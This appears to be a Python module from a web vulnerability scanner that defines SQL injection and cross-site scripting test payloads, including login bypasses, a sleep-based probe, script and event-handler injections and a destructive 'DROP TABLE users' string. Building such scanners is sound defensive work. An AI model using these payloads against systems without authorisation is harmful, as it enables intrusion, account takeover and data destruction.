"""
Payload definitions for SQL Injection and Cross-Site Scripting detection.

This module contains static payload lists used to test for common vulnerabilities.
Each payload is designed to trigger a specific vulnerability signature in the response.
"""

# SQL Injection Payloads
# These payloads are designed to be detected by analyzing error messages and response behavior
SQLI_PAYLOADS = [
    # Classic authentication bypass - attempts to always-true condition
    "' or '1'='1",
    
    # Time-based blind SQLi detection
    "' or sleep(5)--",
    
    # Union-based SQLi - attempts to cause column mismatch error
    "' UNION SELECT NULL--",
    
    # Database error triggering - attempts to access invalid table
    "' and extractvalue(1, concat(0x7e, version()))--",
    
    # Quote escape + comment bypass
    "admin'--",
    
    # Double quote variant for string-based injection
    '" or "1"="1',
    
    # MSSQL-style comment and error
    "'; DROP TABLE users;--",
]

# Cross-Site Scripting Payloads
# These payloads test for lack of output encoding by checking if payload appears verbatim in response
XSS_PAYLOADS = [
    # Basic script tag injection
    "<script>alert('XSS')</script>",
    
    # Event handler injection
    "<img src=x onerror='alert(1)'>",
    
    # SVG-based XSS
    "<svg onload=alert('XSS')>",
    
    # Attribute breakout
    "\" onmouseover=\"alert(1)\"",
    
    # Alternative script tag
    "<iframe src='javascript:alert(1)'></iframe>",
    
    # Body tag with event handler
    "<body onload=alert('XSS')>",
]


def get_payloads_by_type(vuln_type):
    """
    Get payload list by vulnerability type.
    
    Args:
        vuln_type (str): Either 'SQLi' or 'XSS'
    
    Returns:
        list: List of payload strings for the given vulnerability type
    """
    if vuln_type == "SQLi":
        return SQLI_PAYLOADS
    elif vuln_type == "XSS":
        return XSS_PAYLOADS
    else:
        raise ValueError(f"Unknown vulnerability type: {vuln_type}")
